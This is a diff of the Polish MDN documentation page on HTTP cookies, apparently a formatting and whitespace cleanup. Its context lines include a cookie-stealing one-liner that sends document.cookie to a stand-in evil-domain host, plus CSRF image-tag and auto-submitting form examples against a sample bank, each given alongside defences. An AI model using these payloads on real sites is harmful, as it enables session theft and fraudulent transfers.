@@ -46,9 +46,8 @@ Nagłówek [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) jest zawarty w odp
 
 Ten nagłówek nadany przez serwer informuje klienta, że należy zapisać ciasteczko.
 
-> **Uwaga:** W odnośnikach znajdują się przykłady użycia nagłówka `Set-Cookie` w różnych aplikacjach uruchamianych po stronie serwera:
-> 
-> - [PHP](https://secure.php.net/manual/en/function.setcookie.php)
+> **Note:** **Uwaga:** W odnośnikach znajdują się przykłady użycia nagłówka `Set-Cookie` w różnych aplikacjach uruchamianych po stronie serwera:\* [PHP](https://secure.php.net/manual/en/function.setcookie.php)
+>
 > - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
 > - [Python](https://docs.python.org/3/library/http.cookies.html)
 > - [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
@@ -60,7 +59,7 @@ Ten nagłówek nadany przez serwer informuje klienta, że należy zapisać ciast
 
     [page content]
 
-Teraz z każdym kolejnym żądaniem do serwera, używając nagłówka [Cookie](/pl/docs/Web/HTTP/Headers/Cookie), przeglądarka będzie wysyłać także wszystkie przechowywane ciasteczka.
+Teraz z każdym kolejnym żądaniem do serwera, używając nagłówka [Cookie](/pl/docs/Web/HTTP/Headers/Cookie), przeglądarka będzie wysyłać także wszystkie przechowywane ciasteczka.
 
     GET /sample_page.html HTTP/2.0
     Host: www.example.org
@@ -76,7 +75,7 @@ Zamiast wygasnąć po wyłączeniu klienta, _trwałe ciasteczka_ wygasają w kon
 
     Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 
-> **Uwaga:** Ustawiając termin wygaśnięcia, czas i data są określane w odniesieniu do klienta, który zapisuje ciasteczko, nie w odniesieniu do serwera.
+> **Note:** **Uwaga**: Ustawiając termin wygaśnięcia, czas i data są określane w odniesieniu do klienta, który zapisuje ciasteczko, nie w odniesieniu do serwera.
 
 ### Ciasteczka `Secure` i `HttpOnly`
 
@@ -90,7 +89,7 @@ Aby ograniczać możliwości przeprowadzenia ataku cross-site scripting ({{Gloss
 
 Dyrektywy `Domain` i `Path` definiują _zakres_ ciasteczka: do jakich adresów URL ciasteczka powinny być wysyłane.
 
-`Domain` określa dozwolone hosty sieciowe. Jeżeli nie jest ustawiona to domyślną wartością jest [host aktualnej lokalizacji dokumentu](/pl/docs/Web/API/Document/location), **z pominięciem subdomen.** Jeżeli dyrektywa `Domain` _jest_ określona to subdomeny zawsze są uwzględnione.
+`Domain` określa dozwolone hosty sieciowe. Jeżeli nie jest ustawiona to domyślną wartością jest [host aktualnej lokalizacji dokumentu](/pl/docs/Web/API/Document/location), **z pominięciem subdomen.** Jeżeli dyrektywa `Domain` _jest_ określona to subdomeny zawsze są uwzględnione.
 
 Przykładowo, jeżeli ustawiono `Domain=mozilla.org`, to ciasteczka są uwzględnione także dla subdomen takich jak `developer.mozilla.org`.
 
@@ -117,21 +116,21 @@ Atrybut `SameSite` może przyjmować jedną z trzech wartości (bez rozróżnian
 - `None`
   - : Przeglądarka będzie wysyłać ciasteczka zarówno żądaniami pomiędzy stronami (_cross-site_) jak i żądaniami odnoszącymi się do aktualnej strony (_same-site_).
 - `Strict`
-  - : Przeglądarka będzie wysyłać ciasteczka tylko żądaniami _same-site_ (pochodzącymi z witryny, która ustawia ciasteczko). Jeżeli żądanie nie pochodzi z adresu URL aktualnej lokacji to żadne z ciasteczek oznaczonych atrybutem `Strict` nie zostanie przesłane.
+  - : Przeglądarka będzie wysyłać ciasteczka tylko żądaniami _same-site_ (pochodzącymi z witryny, która ustawia ciasteczko). Jeżeli żądanie nie pochodzi z adresu URL aktualnej lokacji to żadne z ciasteczek oznaczonych atrybutem `Strict` nie zostanie przesłane.
 - `Lax`
   - : Ciasteczka `SameSite` są wstrzymywane przy żądaniach, które wywołują ładowanie obrazów lub ramek z innych stron. Będą jednak wysłane, gdy użytkownik przechodzi do adresu URL z zewnętrznej strony, np. poprzez kliknięcie w link.
 
-> **Note:** Przeglądarki decydują się na [domyślne ustawianie `SameSite=Lax`](https://www.chromestatus.com/feature/5088147346030592). Jeżeli istnieje potrzeba wysyła ciasteczka pomiędzy różnymi źródłami (_cross-origin_), należy zrezygnować z zabezpieczenia SameSite używając wartości `None` dla tej dyrektywy. Wymaga ona obecności atrybutu [`Secure`](#ciasteczka_secure_i_httponly).
+> **Note:** Przeglądarki decydują się na [domyślne ustawianie `SameSite=Lax`](https://www.chromestatus.com/feature/5088147346030592). Jeżeli istnieje potrzeba wysyła ciasteczka pomiędzy różnymi źródłami (_cross-origin_), należy zrezygnować z zabezpieczenia SameSite używając wartości `None` dla tej dyrektywy. Wymaga ona obecności atrybutu [`Secure`](#ciasteczka_secure_i_httponly).
 
 ### Prefiksy ciasteczek {{experimental_inline}}
 
-Konstrukcja mechanizmu działania ciasteczek uniemożliwia serwerowi otrzymanie potwierdzenia ustawienia ciasteczka dla bezpiecznego źródła, a nawet dowiedzenia się _gdzie_ ciasteczko zostało pierwotnie ustawione.  Każda subdomena jak na przykład `application.example.com` może ustawić ciasteczko, które będzie wysyłane wraz z żądaniami do `example.com` lub do innych subdomen dzięki ustawieniu atrybutu _Domain_:
+Konstrukcja mechanizmu działania ciasteczek uniemożliwia serwerowi otrzymanie potwierdzenia ustawienia ciasteczka dla bezpiecznego źródła, a nawet dowiedzenia się _gdzie_ ciasteczko zostało pierwotnie ustawione.  Każda subdomena jak na przykład `application.example.com` może ustawić ciasteczko, które będzie wysyłane wraz z żądaniami do `example.com` lub do innych subdomen dzięki ustawieniu atrybutu _Domain_:
 
     Set-Cookie: CSRF=e8b667; Secure; Domain=example.com
 
-Jeżeli podatna aplikacja jest dostępna na subdomenie to ten mechanizm może być wykorzystany w ataku *session fixation.* Gdy użytkownik odwiedza stronę na głównej domenie (lub innej subdomenie), aplikacja może zaufać istniejącej wartości wysłanej w ciasteczku użytkownika. To może pozwolić atakującemu ominąć zabezpieczenie przed CSRF lub przejąć sesję po zalogowaniu się użytkownika.
+Jeżeli podatna aplikacja jest dostępna na subdomenie to ten mechanizm może być wykorzystany w ataku *session fixation.* Gdy użytkownik odwiedza stronę na głównej domenie (lub innej subdomenie), aplikacja może zaufać istniejącej wartości wysłanej w ciasteczku użytkownika. To może pozwolić atakującemu ominąć zabezpieczenie przed CSRF lub przejąć sesję po zalogowaniu się użytkownika.
 
-Alternatywnie, jeżeli główna domena nie używa {{Glossary("HSTS")}} z ustawioną opcją `includeSubdomains`,  to użytkownikowi podlegającemu właśnie atakowi MitM (być może podłączonemu do otwartej sieci Wi-Fi) może zostać zwrócona odpowiedź na żądanie wraz z ustawionym nagłówkiem [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) z nieistniejącej subdomeny. Wynik końcowy byłby taki sam, ponieważ przeglądarka przechowywałaby nielegalny plik cookie i wysyłałaby go na wszystkie inne strony w domenie `example.com`.
+Alternatywnie, jeżeli główna domena nie używa {{Glossary("HSTS")}} z ustawioną opcją `includeSubdomains`,  to użytkownikowi podlegającemu właśnie atakowi MitM (być może podłączonemu do otwartej sieci Wi-Fi) może zostać zwrócona odpowiedź na żądanie wraz z ustawionym nagłówkiem [Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie) z nieistniejącej subdomeny. Wynik końcowy byłby taki sam, ponieważ przeglądarka przechowywałaby nielegalny plik cookie i wysyłałaby go na wszystkie inne strony w domenie `example.com`.
 
 Aby ograniczyć możliwości przeprowadzenia ataku _session fixation_ powinno się przede wszystkim ponownie generować wartości ciasteczka sesyjnego gdy użytkownik się uwierzytelnia (nawet jeśli ciasteczko już istnieje) i dokonywać powiązania tokena CSRF z użytkownikiem. W ramach silniejszej obrony możliwe jest użycie _prefiksów ciasteczek_ w celu potwierdzenia pewnych faktów na temat samych ciasteczek. Dostępne są dwa prefiksy:
 
@@ -142,7 +141,7 @@ Aby ograniczyć możliwości przeprowadzenia ataku _session fixation_ powinno si
 
 Ciasteczka niespełniające kryteriów zostaną odrzucone przez przeglądarkę. Zapewnia to, że gdyby subdomena spróbowała stworzyć takie ciasteczko, to zostanie ono ograniczone do subdomeny lub całkowicie zignorowane. Podczas określania, czy użytkownik jest uwierzytelniony lub czy token CSRF jest poprawny, serwer aplikacji sprawdza tylko ciasteczka o określonych nazwach. Dzięki temu mechanizm prefiksów efektywnie działa jako obrona przed _session fixation._
 
-> **Note:** Aplikacja będąca serwerem _musi_ sprawdzić ciasteczko o pełnej nazwie uwzględniającej prefiks. Dlatego agent użytkownika aplikacji _nie_ wytnie prefiksu przed wysłaniem ciasteczka w nagłówku {{HTTPHeader("Cookie")}}.
+> **Note:** Aplikacja będąca serwerem _musi_ sprawdzić ciasteczko o pełnej nazwie uwzględniającej prefiks. Dlatego agent użytkownika aplikacji _nie_ wytnie prefiksu przed wysłaniem ciasteczka w nagłówku {{HTTPHeader("Cookie")}}.
 
 Aby uzyskać więcej informacji o prefiksach ciasteczek i aktualnym stanie wspieralności tego rozwiązania przez przeglądarki odwiedź [sekcję Set-Cookie](/pl/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes).
 
@@ -173,7 +172,7 @@ Ciasteczka są często używane w aplikacjach webowych do identyfikowania użytk
 (new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
 ```
 
-Atrybut `HttpOnly` może pomóc uniknąć tego ataku poprzez zablokowanie JavaScriptowi dostępu do wartości ciasteczka.  Sposobem na złagodzenie skutków takiego ataku jest wdrożenie surowej [polityki bezpieczeństwa treści (_CSP_)](/pl/docs/Web/HTTP/CSP).
+Atrybut `HttpOnly` może pomóc uniknąć tego ataku poprzez zablokowanie JavaScriptowi dostępu do wartości ciasteczka.  Sposobem na złagodzenie skutków takiego ataku jest wdrożenie surowej [polityki bezpieczeństwa treści (_CSP_)](/pl/docs/Web/HTTP/CSP).
 
 ### Cross-site request forgery (CSRF)
 
@@ -183,7 +182,7 @@ Na stronie [Wikipedii](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_requ
 <img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
 ```
 
-Jeżeli jesteś aktualnie zalogowany na swoim koncie bankowym i odpowiadające ciasteczka są dalej aktualne (i nie ma żadnej dodatkowej walidacji), to próba załadowania "obrazka" zakończy się przelewem pieniędzy. Dla punktów końcowych wymagających żądania POST jest możliwe aby  programowo wykonać potwierdzenie formularza (być może zawartego w niewidzialnym elemencie `<iframe>`) gdy strona jest ładowana:
+Jeżeli jesteś aktualnie zalogowany na swoim koncie bankowym i odpowiadające ciasteczka są dalej aktualne (i nie ma żadnej dodatkowej walidacji), to próba załadowania "obrazka" zakończy się przelewem pieniędzy. Dla punktów końcowych wymagających żądania POST jest możliwe aby  programowo wykonać potwierdzenie formularza (być może zawartego w niewidzialnym elemencie `<iframe>`) gdy strona jest ładowana:
 
 ```html
 <form action="https://bank.example.com/withdraw" method="POST">
@@ -197,11 +196,11 @@ Jeżeli jesteś aktualnie zalogowany na swoim koncie bankowym i odpowiadające c
 Jest kilka technik, których stosowanie powinno być używane do zapobiegania CSRF:
 
 - punkty końcowe GET powinny być idempotentne — akcje, które wprowadzają _zmianę_ i nie mają na celu zwykłego pobrania danych powinny być wykonywane żądaniem POST (lub inną metodą HTTP). Punkty końcowe POST nie powinny dodatkowo obsługiwać żądań GET z parametrami query.
-- Token CSRF powinien być zawarty w elementach `<form>` poprzez użycie niewidzialnego pola wejściowego `<input type="hidden">`. Powinien on być unikalny dla każdego użytkownika i przechowywany (np. w ciasteczku) w sposób pozwalający serwerowi podejrzeć oczekiwną wartość w momencie odebrania żądania HTTP. Dla wszystkich nie-GET'owych żądań potencjalnie mogących wykonać jakąś akcję w systemie, ten token powinien być porównany z jego zapisaną wartością.  W przypadku niezgodności należy odrzucić takie żądanie.
+- Token CSRF powinien być zawarty w elementach `<form>` poprzez użycie niewidzialnego pola wejściowego `<input type="hidden">`. Powinien on być unikalny dla każdego użytkownika i przechowywany (np. w ciasteczku) w sposób pozwalający serwerowi podejrzeć oczekiwną wartość w momencie odebrania żądania HTTP. Dla wszystkich nie-GET'owych żądań potencjalnie mogących wykonać jakąś akcję w systemie, ten token powinien być porównany z jego zapisaną wartością.  W przypadku niezgodności należy odrzucić takie żądanie.
 
   - Ta metoda zabezpieczania polega na tym, że atakujący nie jest w stanie przewidzieć jak wygląda otrzymany przez użytkownika token CSRF. Dodatkowo token powinien być generowany ponownie po każdym zalogowaniu się użytkownika.
 
-- Ciasteczka używane do wykonywania poufnych akcji (takie jak ciasteczka sesyjne) powinny mieć krótki czas życia i atrybut `SameSite` ustawiony na `Strict` lub `Lax`. (zobacz [ciasteczka SameSite](#ciasteczka_samesite)). W przeglądarkach wspierających tę funkcjonalność, efektem będzie upewnienie się, że ciasteczko sesyjne \_nie\_ zostanie wysłane w żądaniach do innych stron, więc żądania te nie będą przez serwer aplikacji uwierzytelnione.
+- Ciasteczka używane do wykonywania poufnych akcji (takie jak ciasteczka sesyjne) powinny mieć krótki czas życia i atrybut `SameSite` ustawiony na `Strict` lub `Lax`. (zobacz [ciasteczka SameSite](#ciasteczka_samesite)). W przeglądarkach wspierających tę funkcjonalność, efektem będzie upewnienie się, że ciasteczko sesyjne \_nie\_\_ \_zostanie wysłane w żądaniach do innych stron, więc żądania te nie będą przez serwer aplikacji uwierzytelnione.
 - Wdrożenie zarówno tokenów CSRF jak i ciasteczek `SameSite` zapewnia ochronę wszystkich przeglądarek nawet w przypadkach gdy ochrona mechanizmu `SameSite` nie może pomóc (np. gdy źródłem ataków jest oddzielna subdomena).
 - Aby poznać inne metody zabezpieczające przed CSRF sprawdź [ściągawkę przygotowaną przez organizację OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).
 
@@ -225,9 +224,9 @@ W skrócie, dyrektywa wymusza na zarządzających stronami internetowymi uzyskan
 
 Aby dowiedzieć się więcej, sprawdź [artykuł na Wikipedii](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive) oraz zdobądź informacje jak wygląda aktualne prawo w docelowym regionie.
 
-### Ciasteczka zombie i  "Evercookies"
+### Ciasteczka zombie i  "Evercookies"
 
-Bardziej radykalnym podejściem do ciasteczek są ciasteczka zombie lub "Evercookies", które po usunięciu są w stanie odtworzyć się na nowo. Zostały zaprojektowane tak, aby ciężko było usunąć je na zawsze. W celu zapewnienia tej funkcjonalności implementacje używają m.in. [Web storage API](/pl/docs/Web/API/Web_Storage_API "DOM Storage") i Flash Local Shared Objects.
+Bardziej radykalnym podejściem do ciasteczek są ciasteczka zombie lub "Evercookies", które po usunięciu są w stanie odtworzyć się na nowo. Zostały zaprojektowane tak, aby ciężko było usunąć je na zawsze. W celu zapewnienia tej funkcjonalności implementacje używają m.in. [Web storage API](/pl/docs/Web/API/Web_Storage_API "DOM Storage") i Flash Local Shared Objects.
 
 - [Evercookie by Samy Kamkar](https://github.com/samyk/evercookie)
 - [Zombie cookies on Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)
